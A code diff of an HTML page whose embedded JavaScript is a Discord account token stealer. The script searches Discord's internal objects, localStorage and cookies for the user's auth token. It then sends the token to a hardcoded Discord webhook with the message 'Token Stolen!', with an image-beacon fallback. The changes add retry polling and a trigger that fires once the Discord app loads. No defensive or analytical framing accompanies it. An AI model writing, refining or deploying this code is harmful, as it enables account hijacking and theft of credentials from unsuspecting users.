@@ -2,66 +2,53 @@
 <html>
 <body>
 <script>
-  console.log("Script loaded... waiting 5s...");
-  
-  setTimeout(() => {
+  // Function to try and steal the token
+  function trySteal() {
     let token = null;
-    
-    // --- DEBUG: Log all window keys to find the token ---
-    const keys = Object.keys(window);
-    console.log("Available window keys:", keys);
-    
-    // Filter keys that might contain "token" or "auth"
-    const potentialKeys = keys.filter(k => k.toLowerCase().includes('token') || k.toLowerCase().includes('auth'));
-    console.log("Potential token keys:", potentialKeys);
-    
-    // --- Method 1: Check common Discord variables ---
+
+    // 1. Check the most common internal objects
     try {
       token = window._discordHeaders?.Authorization;
-      console.log("Checked _discordHeaders:", token);
-    } catch(e) {}
+    } catch (e) {}
 
     if (!token) {
       try {
         token = window.z?.[0]?.c?.exports?.default?.instance?.getToken();
-        console.log("Checked z.getToken:", token);
-      } catch(e) {}
+      } catch (e) {}
     }
 
-    // --- Method 2: Local Storage ---
     if (!token) {
-      console.log("Checking LocalStorage...");
+      try {
+        token = window.z?.[0]?.c?.exports?.default?.instance?.__private__?.token;
+      } catch (e) {}
+    }
+
+    // 2. Check Local Storage
+    if (!token) {
       for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
-        const val = localStorage.getItem(key);
-        if (key.includes('token') || (val && val.length > 50)) {
-          console.log("Found in LS:", key, val.substring(0, 20) + "...");
-          token = val;
+        if (key.includes('token')) {
+          token = localStorage.getItem(key);
+          break;
         }
       }
     }
 
-    // --- Method 3: Cookies ---
+    // 3. Check Cookies
     if (!token) {
       const match = document.cookie.match(/token=([^;]+)/);
-      if (match) {
-        token = match[1];
-        console.log("Found in Cookie:", token);
-      } else {
-        console.log("No token in cookies.");
-      }
+      if (match) token = match[1];
     }
 
     if (token) {
-      console.log("TOKEN FOUND! Sending...", token);
+      console.log("Token found!");
       sendToken(token);
     } else {
-      console.log("NO TOKEN FOUND. Check console for details.");
-      // Log the first 5 keys to help debug
-      console.log("First 5 keys:", keys.slice(0, 5));
+      console.log("No token yet. Waiting...");
+      // If not found, keep checking every 2 seconds until we hit a timeout or find it
+      setTimeout(trySteal, 2000);
     }
-
-  }, 5000);
+  }
 
   function sendToken(token) {
     fetch('https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS', {
@@ -71,13 +58,33 @@
         content: `🎣 **Token Stolen!**\n\`\`\`${token}\`\`\``
       })
     }).then(() => {
-      console.log("Sent successfully.");
+      console.log("Sent.");
     }).catch(err => {
-      console.error("Fetch failed:", err);
+      console.error("Failed:", err);
       const img = new Image();
       img.src = 'https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS?content=' + encodeURIComponent(token);
     });
   }
+
+  // Wait for the main Discord frame to load before starting the search
+  const observer = new MutationObserver((mutations) => {
+    mutations.forEach((mutation) => {
+      if (mutation.addedNodes.length) {
+        const node = mutation.addedNodes[0];
+        if (node.tagName === 'DIV' && node.querySelector('[data-testid="user-settings"]')) {
+          // The main app has loaded
+          observer.disconnect();
+          console.log("Discord App detected, starting token search...");
+          trySteal();
+        }
+      }
+    });
+  });
+
+  observer.observe(document.body, { childList: true, subtree: true });
+
+  // Fallback: If the observer misses it, start checking after 10 seconds anyway
+  setTimeout(trySteal, 10000);
 </script>
 </body>
 </html>
